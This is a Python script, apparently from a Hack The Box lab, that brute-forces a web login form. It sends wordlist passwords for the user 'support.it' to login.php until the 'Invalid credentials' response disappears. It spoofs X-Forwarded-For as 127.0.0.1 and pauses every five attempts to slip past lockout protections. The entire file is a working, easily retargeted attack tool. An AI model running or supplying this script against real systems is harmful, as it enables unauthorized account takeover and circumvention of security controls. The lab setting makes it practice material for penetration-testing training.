import sys
import requests
import os.path
import time 

# target url, change as needed
url = "http://<IP>/login.php"

# fake headers to present ourself as Chromium browser, change if needed
headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36","Cookie": "htb_sessid=######","X-Forwarded-For":"127.0.0.1"}

# string expected if the answer is wrong
invalid = "Invalid credentials"



# wordlist is expected as one word per line, function kept to let you to parse different wordlist format keeping the code clean
def unpack(fline):
    answer = fline

    return answer

# do the web request, change data as needed
def do_req(url, passwd, headers):
    # closely inspect POST data sent using any intercepting proxy to create a valid data

    data = {"userid": "support.it", "passwd": passwd, "submit": "submit","rememberme":"rememberme"}
    res = requests.post(url, headers=headers, data=data)

    return res.text

# pretending we just know the message received when the answer is wrong, we flip the check
def check(haystack, needle):
    # if our invalid string is found in response body return False
    if needle in haystack:
        return False
    else:
        return True

def main():
    # check if wordlist has been given and exists
    if (len(sys.argv) > 1) and (os.path.isfile(sys.argv[1])):
        fname = sys.argv[1]
    else:
        print("[!] Please check wordlist.")
        print("[-] Usage: python3 {} /path/to/wordlist".format(sys.argv[0]))
        sys.exit()
    counter=0
    # open the file
    with open(fname) as fh:
        for fline in fh:
            # wait 30 seconds to avoid lock
            counter+=1
            if counter == 5:
                print("5 failed login attemps, waiting 30 seconds...")
                time.sleep(30)
                counter=0
                
            # skip line if starts with a comment
            if fline.startswith("#"):
                continue
            # extract userid and password from wordlist, removing trailing newline
            answer = unpack(fline.rstrip())

            # do HTTP request
            print("[-] Checking word {}".format(answer))
            res = do_req(url, answer, headers)
            
            # check if response text matches our content
            #print(res)
            if (check(res, invalid)):
                print("[+] Valid answer found: {}".format(answer))
                sys.exit()

if __name__ == "__main__":
    main()
